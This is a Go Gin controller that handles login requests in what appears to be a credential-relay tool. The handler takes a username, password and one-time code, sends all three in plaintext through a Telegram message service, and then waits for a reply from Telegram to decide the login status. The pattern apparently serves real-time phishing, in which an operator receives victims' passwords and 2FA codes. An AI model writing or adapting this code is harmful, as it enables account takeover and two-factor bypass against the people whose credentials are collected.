package controllers

import (
	"github.com/gin-gonic/gin"
	"go-automation-login/services"
	"log"
	"net/http"
)

// LoginHandler xử lý API đăng nhập
func LoginHandler(c *gin.Context) {
	var loginRequest struct {
		Username string `json:"username"`
		Password string `json:"password"`
		Otp      string `json:"otp"`
	}

	// Kiểm tra dữ liệu đầu vào
	if err := c.ShouldBindJSON(&loginRequest); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Dữ liệu không hợp lệ"})
		return
	}

	// Gửi tin nhắn Telegram với requestID
	requestID := services.SendLoginMessage(loginRequest.Username, loginRequest.Password, loginRequest.Otp)

	// Chờ phản hồi từ Telegram (20 giây)
	status, err := services.WaitForTelegramResponse(loginRequest.Username, requestID)
	if err != nil {
		c.JSON(http.StatusRequestTimeout, gin.H{"status": "timeout", "message": "⏳ Hết thời gian chờ phản hồi!"})
		return
	}

	// Trả kết quả về client
	log.Printf("✅ Nhận phản hồi từ Telegram: %s", status)
	c.JSON(http.StatusOK, gin.H{"status": status, "message": "Cập nhật trạng thái thành công!"})
}
